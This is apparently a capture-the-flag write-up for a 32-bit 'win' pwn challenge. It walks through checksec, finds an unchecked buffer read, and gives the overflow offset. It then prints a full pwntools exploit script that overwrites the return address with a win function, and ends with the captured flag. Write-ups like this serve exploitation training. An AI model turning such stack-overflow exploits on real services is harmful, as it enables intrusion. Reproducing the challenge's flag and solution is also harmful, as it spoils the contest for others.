
This write up is for the win pwn challenge.

The first thing I am going to do is to run both file and checksec to see the basic information and protections on the binary.
```
*] '/home/kali/Downloads/CWE2025/real/win'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No

```
After putting into ghidra I  can see that the program reads my input into a buffer without checking the size. This immediately led to a buffer overflow to a win function.

I used cyclic in pwndbg to find my offset of 52
I then created my python script to solve 

```python
#!/usr/bin/env python3 
import subprocess
from pwn import *

binary_path = './win' # exe
libc_path = ''
remote_host = 'www.cweaccessionsctf.com'
remote_port = 1300  # <-- Needs to be a valid integer if using REMOTE

context.binary = binary_path
#context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary
#libc = ELF(libc_path)
rop = ROP(elf)
#libc = ELF(libc_path)

if args.GDB:
    p = gdb.debug(binary_path, gdbscript='b *')
elif args.REMOTE:
    p = remote(remote_host, remote_port)
else:
    p = process(binary_path)

def main():
    win = 0x080491a6
    payload = b''
    payload += b'A' * 52 
    payload += p32(win)

    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    main()


```

CWE{no_stack_smashing_here_Nl8VyJ4C}

<!--stackedit_data:
eyJoaXN0b3J5IjpbMTgxNzk5OTc1OSwtMTEyMjAxNDAwMV19
-->